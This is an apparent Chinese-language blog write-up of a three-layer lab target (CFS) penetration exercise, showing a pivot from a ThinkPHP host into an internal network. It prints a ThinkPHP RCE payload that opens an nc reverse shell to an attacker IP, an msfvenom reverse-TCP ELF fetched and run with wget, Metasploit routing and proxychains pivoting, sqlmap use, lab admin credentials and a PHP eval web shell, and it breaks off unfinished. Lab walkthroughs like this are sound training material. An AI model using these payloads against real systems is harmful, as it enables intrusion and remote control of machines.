---
title: CFS三层靶机内网渗透
date: 2020-10-22 10:06:26
tags: [内网渗透]
categories: 内网渗透
---

[toc]

## 靶机搭建

> ***网卡设置***
>
> > 需要桥接模式，且需要路由器改网段和再分配一个ip，所以直接用了nat模式
> >
> > ![image-20201022101116458](CFS三层靶机内网渗透/image-20201022101116458.png)
>
> ***设置静态ip***
>
> > 靶机一：
> >
> > `ifconfig ens36 192.168.22.11 netmask 255.255.255.0 `
> >
> > ![image-20201022101321010](CFS三层靶机内网渗透/image-20201022101321010.png)
> >
> > ![image-20201022101339056](CFS三层靶机内网渗透/image-20201022101339056.png)
> >
> > 靶机二:
> >
> > ![image-20201022101635533](CFS三层靶机内网渗透/image-20201022101635533.png)
> >
> > 靶机三:已经设置为静态ip无需设置

### target1

> 利用thinkphp的rce直接反弹shell
>
> > `/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=nc `
> >
> > `192.168.11.129 1234 -e /bin/bash`
> >
> > 攻击机:
> >
> > `nc -lvp 1234`
>
> ***交互式shell***
>
> > `python -c 'import pty;pty.spawn("/bin/bash")'`
> >
> > python -c 'import pty;pty.spawn("/bin/bash")'
>
> **第一个falg**
>
> > ![image-20201022143732121](CFS三层靶机内网渗透/image-20201022143732121.png)
>
> ***根目录下第二个flag**
>
> > ![image-20201022143828870](CFS三层靶机内网渗透/image-20201022143828870.png)
>
> ***rebots中第三个falg***
>
> > ![image-20201022144106802](CFS三层靶机内网渗透/image-20201022144106802.png)
> >
> > ![image-20201022144118718](CFS三层靶机内网渗透/image-20201022144118718.png)
>
> 

>
>
>****
>
>****
>
>***生成elf马***
>
>> `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=4321 -f elf > shell1.elf`
>
>***利用python开启http服务***
>
>> `python -m SimpleHTTPServer 8080`
>
>攻击机下载shell
>
>> `wget htt://192.168.11.129:8080/shell1.elf`
>>
>> `chmod +x shell1.elf`
>>
>> `./shell1.elf`
>
>***msf开启监听***
>
>> `search handler`
>>
>> `use 29`
>>
>> ` set payload linux/x64/meterpreter/reverse_tcp `
>>
>> `set LHOST 192.168.11.129`
>>
>> `set payload 4321`
>>
>> `run`
>>
>> 得到meterpreter

### target2

>
>
>***添加路由***
>
>> ***当前网段***
>>
>> `run get_local_subnets`
>>
>> ![image-20201022151629404](CFS三层靶机内网渗透/image-20201022151629404.png)
>>
>> `run autoroute -s 192.168.22.0/24`
>>
>> ![image-20201022151826785](CFS三层靶机内网渗透/image-20201022151826785.png)
>
>***扩大攻击面端口扫描***
>
>> `search portscan`
>>
>> `use 5`
>>
>> ![image-20201022153557357](CFS三层靶机内网渗透/image-20201022153557357.png)
>>
>> 设置代理
>>
>> > 
>> >
>> > ![image-20201022154452395](CFS三层靶机内网渗透/image-20201022154452395.png)
>> >
>> > ![image-20201022154519030](CFS三层靶机内网渗透/image-20201022154519030.png)
>> >
>> > `set SRVPORT 2222`
>> >
>> > `vim /etc/proxychains.conf`
>> >
>> > `proxychains nmap -Pn -sT 192.168.22.22`
>
>访问80端口
>
>>
>>
>>![image-20201022154737024](CFS三层靶机内网渗透/image-20201022154737024.png)
>>
>>ps:
>>
>>> 添加路由后可以不设置代理也可访问
>
>****
>
>***发现注入点***
>
>> 利用sqlmap直接扫:http://192.168.22.22/index.php?r=vul&keyword=1d
>>
>> 后台登入:admin 123qwe
>
>***flag***
>
>![image-20201026163245130](CFS三层靶机内网渗透/image-20201026163245130.png)
>
>***后台写入一句话***
>
>> `<? php @eval($_POST[pass]);?>`

待续...